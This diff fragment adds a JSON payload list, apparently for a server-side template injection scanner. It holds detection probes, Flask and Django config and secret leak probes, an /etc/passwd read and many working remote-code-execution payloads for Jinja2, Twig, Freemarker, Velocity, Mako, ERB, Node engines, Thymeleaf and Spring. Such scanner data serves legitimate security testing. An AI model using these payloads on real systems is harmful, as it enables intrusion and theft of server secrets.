+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal [[${}]] probe (Thymeleaf inline)"
+  },
+  {
+    "engine": "Universal",
+    "payload": "<%= 7*7 %>",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal <%= %> probe (ERB/JSP/EJS)"
+  },
+  {
+    "engine": "Universal",
+    "payload": "@(7*7)",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal @() probe (Razor)"
+  },
+  {
+    "engine": "Universal",
+    "payload": "{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal {} probe (Smarty/Dust)"
+  },
+  {
+    "engine": "Universal",
+    "payload": "${{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal ${{}} probe (nested)"
+  },
+  {
+    "engine": "Universal",
+    "payload": "#{7*7}#",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal #{}# probe"
+  },
+  {
+    "engine": "Universal",
+    "payload": "{{=7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal {{=}} delimiter probe"
+  },
+  {
+    "engine": "Universal",
+    "payload": "a{*comment*}b{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal Smarty-comment-split probe"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{config}}",
+    "matcher": "<Config|SECRET_KEY|DEBUG",
+    "category": "config-leak",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "name": "Jinja2 Flask config leak"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{config.items()}}",
+    "matcher": "SECRET_KEY|DATABASE|API_KEY",
+    "category": "config-leak",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "Jinja2 config items"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{self}}",
+    "matcher": "TemplateReference",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.5,
+    "name": "Jinja2 self reference (non-arith)"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{request}}",
+    "matcher": "Request|wsgi|environ",
+    "category": "info-leak",
+    "severity": "MEDIUM",
+    "cvss": 5.5,
+    "name": "Jinja2 Flask request leak"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{request.environ}}",
+    "matcher": "HTTP_HOST|REMOTE_ADDR",
+    "category": "info-leak",
+    "severity": "MEDIUM",
+    "cvss": 6.0,
+    "name": "Jinja2 WSGI environ leak"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{settings.SECRET_KEY}}",
+    "matcher": "[A-Za-z0-9!@#$%^&*()_+=-]{32,}",
+    "category": "secret-leak",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "Jinja2 Django SECRET_KEY leak"
+  },
+  {
+    "engine": "Twig",
+    "payload": "{{_self}}",
+    "matcher": "Twig_Template|Twig\\\\Template",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.5,
+    "name": "Twig _self introspection (non-arith)"
+  },
+  {
+    "engine": "Twig",
+    "payload": "{{app.request.server.all|join(',')}}",
+    "matcher": "HTTP_HOST|REMOTE_ADDR",
+    "category": "info-leak",
+    "severity": "MEDIUM",
+    "cvss": 6.0,
+    "name": "Twig Symfony server env leak"
+  },
+  {
+    "engine": "Twig",
+    "payload": "{{dump(app)}}",
+    "matcher": "Symfony|Request|Session",
+    "category": "info-leak",
+    "severity": "HIGH",
+    "cvss": 7.0,
+    "name": "Twig Symfony app dump"
+  },
+  {
+    "engine": "Smarty",
+    "payload": "{$smarty.version}",
+    "matcher": "\\d+\\.\\d+\\.\\d+",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Smarty version probe (non-arith)"
+  },
+  {
+    "engine": "Smarty",
+    "payload": "{$smarty.template_object->smarty->compile_dir}",
+    "matcher": "/tmp|compile|cache",
+    "category": "info-leak",
+    "severity": "MEDIUM",
+    "cvss": 5.5,
+    "name": "Smarty compile_dir leak"
+  },
+  {
+    "engine": "Mako",
+    "payload": "${request}",
+    "matcher": "Request|environ",
+    "category": "info-leak",
+    "severity": "MEDIUM",
+    "cvss": 5.5,
+    "name": "Mako request leak"
+  },
+  {
+    "engine": "Velocity",
+    "payload": "$class.inspect('java.lang.System').type.getProperty('user.dir')",
+    "matcher": "/|\\\\",
+    "category": "info-leak",
+    "severity": "MEDIUM",
+    "cvss": 5.5,
+    "name": "Velocity system property leak"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
+    "matcher": "BufferedReader|Popen|warning|class",
+    "category": "sandbox-escape",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "Jinja2 subclasses RCE primitive"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Jinja2 Flask globals RCE"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Jinja2 cycler globals RCE"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{lipsum.__globals__.os.popen('id').read()}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Jinja2 lipsum globals RCE"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{namespace.__init__.__globals__.os.popen('id').read()}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Jinja2 namespace globals RCE"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Jinja2 joiner globals RCE"
+  },
+  {
+    "engine": "Twig",
+    "payload": "{{['id']|filter('system')}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Twig filter system RCE"
+  },
+  {
+    "engine": "Twig",
+    "payload": "{{['id',1]|sort('system')}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Twig sort callback RCE"
+  },
+  {
+    "engine": "Twig",
+    "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Twig sandbox bypass RCE"
+  },
+  {
+    "engine": "Smarty",
+    "payload": "{php}echo `id`;{/php}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Smarty {php} tag RCE"
+  },
+  {
+    "engine": "Smarty",
+    "payload": "{system('id')}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Smarty system() RCE"
+  },
+  {
+    "engine": "Freemarker",
+    "payload": "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Freemarker Execute class RCE"
+  },
+  {
+    "engine": "Freemarker",
+    "payload": "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",[\"id\"]).start()}",
+    "matcher": "Process|UNIX",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Freemarker ObjectConstructor RCE"
+  },
+  {
+    "engine": "Velocity",
+    "payload": "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")",
+    "matcher": "java\\.lang\\.UNIXProcess|Process",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Velocity Runtime.exec RCE"
+  },
+  {
+    "engine": "Mako",
+    "payload": "<%import os%>${os.popen('id').read()}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Mako os.popen RCE"
+  },
+  {
+    "engine": "Mako",
+    "payload": "<%import subprocess%>${subprocess.check_output('id',shell=True)}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Mako subprocess RCE"
+  },
+  {
+    "engine": "ERB",
+    "payload": "<%=`id`%>",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "ERB backtick RCE"
+  },
+  {
+    "engine": "ERB",
+    "payload": "<%=system('id')%>",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "ERB system RCE"
+  },
+  {
+    "engine": "ERB",
+    "payload": "<%=IO.popen('id').read%>",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "ERB IO.popen RCE"
+  },
+  {
+    "engine": "ERB",
+    "payload": "<%=File.open('/etc/passwd').read%>",
+    "matcher": "root:x:",
+    "category": "file-read",
+    "severity": "CRITICAL",
+    "cvss": 9.0,
+    "name": "ERB File.open passwd"
+  },
+  {
+    "engine": "Slim",
+    "payload": "#{`id`}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Slim backtick RCE"
+  },
+  {
+    "engine": "Pug/Jade",
+    "payload": "#{process.mainModule.require('child_process').execSync('id').toString()}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Pug Node child_process RCE"
+  },
+  {
+    "engine": "Pug/Jade",
+    "payload": "#{global.process.mainModule.require('child_process').execSync('id')}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Pug global.process RCE"
+  },
+  {
+    "engine": "Handlebars",
+    "payload": "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Handlebars constructor.constructor RCE"
+  },
+  {
+    "engine": "Tornado",
+    "payload": "{%import os%}{{os.popen('id').read()}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Tornado import os RCE"
+  },
+  {
+    "engine": "Nunjucks",
+    "payload": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Nunjucks range.constructor RCE"
+  },
+  {
+    "engine": "EJS",
+    "payload": "<%- global.process.mainModule.require('child_process').execSync('id').toString() %>",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "EJS process.mainModule RCE"
+  },
+  {
+    "engine": "EJS",
+    "payload": "<%= require('child_process').execSync('id').toString() %>",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "EJS direct require RCE"
+  },
+  {
+    "engine": "Thymeleaf",
+    "payload": "[[${T(java.lang.Runtime).getRuntime().exec(\"id\")}]]",
+    "matcher": "Process|UNIX|java\\.lang",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Thymeleaf SpEL Runtime.exec RCE"
+  },
+  {
+    "engine": "Thymeleaf",
+    "payload": "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x",
+    "matcher": "Process|UNIX",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Thymeleaf preprocessor RCE"
+  },
+  {
+    "engine": "SpEL/Spring",
+    "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "matcher": "Process|UNIX",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Spring SpEL Runtime.exec"
+  },
+  {
+    "engine": "SpEL/Spring",
+    "payload": "${new java.lang.ProcessBuilder('id').start()}",
+    "matcher": "Process|UNIX",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Spring SpEL ProcessBuilder"
+  },
+  {
+    "engine": "JSP/JSTL",
+    "payload": "<%@page import=\"java.io.*\"%><%Runtime.getRuntime().exec(\"id\");%>",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "JSP Runtime.exec RCE"
+  },
+  {
+    "engine": "Razor",
+    "payload": "@{System.Diagnostics.Process.Start(\"cmd\",\"/c whoami\");}",
+    "matcher": "Process|System\\.Diagnostics",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Razor Process.Start RCE"
+  },
+  {
+    "engine": "Groovy/GString",
+    "payload": "${\"id\".execute().text}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "name": "Groovy execute RCE"
+  },
+  {
+    "engine": "Scriban",
+    "payload": "{{ exec 'id' }}",
+    "matcher": "uid=\\d+",
+    "category": "rce",
+    "severity": "HIGH",
+    "cvss": 8.0,
+    "name": "Scriban exec probe (if exec exposed)"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{%print 7*7%}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Jinja2 print-statement arithmetic"
+  },
+  {
+    "engine": "Twig",
+    "payload": "{{ 7 * 7 }}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Twig spaced arithmetic"
+  },
+  {
+    "engine": "Freemarker",
+    "payload": "${(7*7)}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Freemarker parenthesised arithmetic"
+  },
+  {
+    "engine": "Velocity",
+    "payload": "#evaluate('#set($x=7*7)$x')",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Velocity evaluate-directive probe"
+  },
+  {
+    "engine": "Smarty",
+    "payload": "{$x=7*7}{$x}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Smarty assign arithmetic"
+  },
+  {
+    "engine": "Mako",
+    "payload": "<%self.x=7*7%>${self.x}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Mako module-level arithmetic"
+  },
+  {
+    "engine": "Tornado",
+    "payload": "{% set x=7*7 %}{{x}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Tornado set arithmetic"
+  },
+  {
+    "engine": "Nunjucks",
+    "payload": "{% set x=7*7 %}{{x}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Nunjucks set arithmetic"
+  },
+  {
+    "engine": "Liquid",
+    "payload": "{% assign x=7 | times:7 %}{{x}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Liquid assign times probe"
+  },
+  {
+    "engine": "Handlebars.java",
+    "payload": "{{#if (eq (multiply 7 7) 49)}}49{{/if}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Handlebars.java eq-multiply probe"
+  },
+  {
+    "engine": "Dust",
+    "payload": "{@math key=7 method=\"multiply\" operand=7/}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Dust math-helper probe"
+  },
+  {
+    "engine": "Pebble",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Pebble arithmetic probe"
+  },
+  {
+    "engine": "JinjaX",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "JinjaX arithmetic probe"
+  },
+  {
+    "engine": "Latte",
+    "payload": "{=7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Latte expression arithmetic probe"
+  },
+  {
+    "engine": "Blade",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Laravel Blade arithmetic probe"
+  },
+  {
+    "engine": "Volt",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Phalcon Volt arithmetic probe"
+  },
+  {
+    "engine": "Handlebars",
+    "payload": "{{math 7 '*' 7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Handlebars math-helper probe"
+  },
+  {
+    "engine": "Razor",
+    "payload": "@{ var x = 7*7; }@x",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Razor variable arithmetic"
+  },
+  {
+    "engine": "ASP.NET",
+    "payload": "<%# 7*7 %>",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "ASP.NET data-binding arithmetic probe"
+  },
+  {
+    "engine": "Genshi",
+    "payload": "${7 * 7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Genshi spaced arithmetic"
+  }
 ]
